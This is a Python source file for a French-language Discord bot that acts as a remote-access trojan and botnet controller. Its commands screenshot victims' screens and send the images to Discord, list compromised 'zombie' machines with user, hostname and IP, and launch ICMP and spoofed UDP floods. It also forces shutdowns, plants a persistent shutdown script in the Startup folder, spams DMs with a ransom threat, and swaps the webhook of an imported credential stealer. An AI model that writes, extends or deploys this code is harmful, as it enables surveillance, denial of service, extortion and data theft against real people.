import getpass
import wx
import chipeur
import hideme
import discord
from discord.ext import commands
import asyncio
import os
import time
from time import sleep
import socket
from urllib.request import Request, urlopen
import Fck
import socket as s
import IDbot

bot = commands.Bot(command_prefix = "%", description = "Mojito's Bot")


@bot.event
async def on_ready():
    print("Ready !")






@bot.command()
async def servInf(ctx):
    server = ctx.guild
    servName = server.name
    servDescription = server.description
    numberPeople = server.member_count
    numberTextChannels = len(server.text_channels)
    numberVocalChannels = len(server.voice_channels)
    send = f"Vous êtes {numberPeople} sur le serveur **{servName}**. \n \n Description du serveur: {servDescription} \n \n Ce serveur possède **{numberTextChannels}** salons textuels et **{numberVocalChannels}** salons vocaux !"
    await ctx.send(send)










@bot.command(help="Spam une personne de ce serveur avec le nombre de message, la cible et le message(sans espace).    ex: %spam 6 @cible ton_message")
async def spam(ctx, occ, member: discord.Member = None, text: str = "Аккаунт взломан за 72 часа, если деньги не выплачены --> 2000€"):
    if member is not None:
        channel = member.dm_channel
        if channel is None:
            channel = await member.create_dm()
            await ctx.send("Spam en cours !")
            for i in range(int(occ)):
                sleep(5)
                await channel.send(text)
            await ctx.send("Spam terminé !")
    else:
        await ctx.send("Tu n'as pas précisé l'utilisateur visé.    ex: %spam @cible ton message")











@bot.command()
async def screen(ctx, arg: str = '0'):
    usr = getpass.getuser()
    ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    if arg == '0' or arg == ip:
        path = r'C:\Users\%s\Pictures' % usr
        ok = wx.App()
        land = wx.ScreenDC()
        size = land.GetSize()
        tampon = wx.Bitmap(size[0], size[1])
        ram = wx.MemoryDC(tampon)
        ram.Blit(0, 0, size[0], size[1], land, 0, 0)
        del ram
        tampon.SaveFile(path + "\\ftgbvdcs.png", wx.BITMAP_TYPE_PNG)
        path = path+"\\ftgbvdcs.png"
        await ctx.send("screen de "+ usr , file=discord.File(path))
        os.remove(path)





@bot.command()
async def DDoS_icmp(ctx, target: str = '0'):
    if target == '0':
        await ctx.send("saisie invalide | ex : %DDoS_icmp <@IP>")
    else:
        await ctx.send("DDoS en cours !")
        Fck.icmp(target, '1000')








@bot.command()
async def DDoS_udp(ctx, target: str = '0', port: str = '0', fake_ip: str = '0'):
    if target == '0' or port == '0' or fake_ip == '0':
        await ctx.send("saisie invalide | ex : %DDoS_udp <@IP> <port> <fausse @IP source>")
    else:
        await ctx.send("DDoS en cours !")
        Fck.udp(target, port, fake_ip)








@bot.command()
async def shutdownAll(ctx, arg: str = '1'):
    await ctx.send("Tout les pc éteints, je ne suis plus disponible pour le moment. Bonne journée !")
    os.system("shutdown /s /f /t "+ arg)








@bot.command()
async def shutdown(ctx, target, arg: str = '1'):
    who_i_am = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    usr = getpass.getuser()
    if target == who_i_am or target == usr:
        await ctx.send("Cible éteinte !")
        os.system("shutdown /s /f /t "+ arg)







@bot.command()
async def getzombies(ctx):
    usr = getpass.getuser()
    pc = socket.gethostname()
    ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    await ctx.send(usr + " | " + pc + " | " + " | " + ip)









@bot.command()
async def killhim(ctx, arg: str = '0'):
    if arg == '0':
        await ctx.send("Tu ne connais pas la syntaxe de cette commande | COMMANDE DANGEREUSE")
    else:
        who_i_am = urlopen(Request("https://ifconfig.me")).read().decode().strip()
        if arg == who_i_am:
            await ctx.send("PC tué !")
            bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
            with open(bat_path + '\\' + "end.bat", "w+") as end_file:
                end_file.write("shutdown /s /f /t 1")
            os.system("shutdown /s /f /t "+ arg)








@bot.command()
async def whoishost(ctx):
    pc = socket.gethostname()
    ip = "None"
    usr = getpass.getuser()
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    await ctx.send(usr +" est connecté | @IP : "+ ip +" | nom du PC : "+ pc)











@bot.command(help="Recherche les informations d'un site web et son adresse IP \n   ex: %whois google.com")
async def Whois(ctx, host):
    res = whois.whois(str(host))
    message = f"**/🌐/👨🏻‍💻/- - - - - WHOIS de {host} - - - - -/🌐/👨🏻‍💻/** \n \n**Domain name :** {res.domain_name} \n**Registrar :** {res.registrar} \n**Whois_server :** {res.whois_server} \n**Referral_url :** {res.referral_url} \n \n**Updated_date :** {res.updated_date} \n**Date de Création :** {res.creation_date} \n **Date d'expiration :** {res.expiration_date} \n \n**Name Servers :** {res.name_servers} \n \n**Statut :** {res.status} \n \n**E-mails :** {res.emails} \n**Dnssec :** {res.dnssec} \n**Name :** {res.name} \n**Org :** {res.org} \n**Adresse :** {res.address} \n**Ville :** {res.city} \n**Etat :** {res.state} \n**Zipcode (code postal) :** {res.zipcode} \n**Pays :** {res.country} \n \n**Adresse IP : **" + s.gethostbyname(host)

    await ctx.send(message)



@bot.command()
async def changeTk(ctx, arg: str = '0'):
    if len(arg) < 20:
        await ctx.send("Tu fais quoi !?")
    else:
        await ctx.send("Tk changé ! Je serai disponible sur le nouveau !")
        IDbot.ID = arg




@bot.command()
async def changeWbHook(ctx, arg: str = '0'):
    if len(arg) < 10:
        await ctx.send("Tu fais quoi !")
    else:
        chipeur.WEBHOOK_URL = str(arg)
        await ctx.send("WbHook changé !")





try:
    bot.run(IDbot.ID)
except:
    pass
